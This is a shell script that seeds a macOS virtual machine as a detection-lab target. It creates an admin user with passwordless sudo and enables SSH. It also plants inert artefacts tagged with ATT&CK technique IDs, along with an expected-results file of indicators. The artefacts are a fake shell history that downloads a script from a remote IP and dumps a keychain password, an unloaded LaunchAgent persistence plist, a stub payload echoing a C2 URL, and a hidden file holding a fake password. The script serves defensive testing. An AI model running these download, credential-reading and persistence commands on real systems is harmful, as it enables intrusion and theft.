#!/bin/sh
# Make a macOS VM a Gandalf target: 'gandalf' admin user with passwordless sudo
# (Gandalf's collectors run sudo over SSH) and inert, known artefacts.
# Run as root: LAB_PASSWORD=... sh seed-macos.sh
set -eu
: "${LAB_PASSWORD:?}"

if ! id gandalf >/dev/null 2>&1; then
  sysadminctl -addUser gandalf -fullName "Rowanholt lab" -password "$LAB_PASSWORD" -admin
  createhomedir -c -u gandalf >/dev/null 2>&1 || true
else
  dscl . -passwd /Users/gandalf "$LAB_PASSWORD"
fi
echo 'gandalf ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/gandalf
chmod 0440 /etc/sudoers.d/gandalf
systemsetup -setremotelogin on >/dev/null 2>&1 || launchctl load -w /System/Library/LaunchDaemons/ssh.plist 2>/dev/null || true

H=/Users/gandalf
mkdir -p "$H" /Users/Shared/.x /etc/rivendell-lab /Library/LaunchAgents

# T1059.004 / T1105
cat > "$H/.zsh_history" <<'H'
: 1792800000:0;whoami
: 1792800010:0;curl http://198.51.100.23:8080/m.sh -o /Users/Shared/.x/update.sh
: 1792800020:0;chmod +x /Users/Shared/.x/update.sh
: 1792800030:0;security find-generic-password -ga "lab" 2>&1 | grep password
H

# T1543.001: LaunchAgent persistence (plist only; not loaded).
cat > /Library/LaunchAgents/com.rivendell-lab.update.plist <<'P'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.rivendell-lab.update</string>
  <key>ProgramArguments</key><array><string>/Users/Shared/.x/update.sh</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
P

cat > /Users/Shared/.x/update.sh <<'S'
#!/bin/sh
# rivendell-lab inert payload: prints, never connects
echo "curl http://c2.rivendell-lab.test/next"
S
chmod 0755 /Users/Shared/.x/update.sh

# T1564.001: hidden file with keywords.
printf 'password=Winter2026!\nprivate key for lab\n' > /Users/Shared/.x/.notes
chown -R gandalf:staff "$H" 2>/dev/null || true

cat > /etc/rivendell-lab/expected.json <<'J'
{
  "seeded": [
    {"path": "/Users/gandalf/.zsh_history", "attack": "T1059.004", "expect": ["curl http", "198.51.100.23"]},
    {"path": "/Library/LaunchAgents/com.rivendell-lab.update.plist", "attack": "T1543.001"},
    {"path": "/Users/Shared/.x/update.sh", "attack": "T1105", "yara": ["Suspicious_Network_Activity"]},
    {"path": "/Users/Shared/.x/.notes", "attack": "T1564.001", "keywords": ["password", "private key"]}
  ],
  "iocs": ["198.51.100.23", "c2.rivendell-lab.test"]
}
J
echo "seeded $(hostname)"
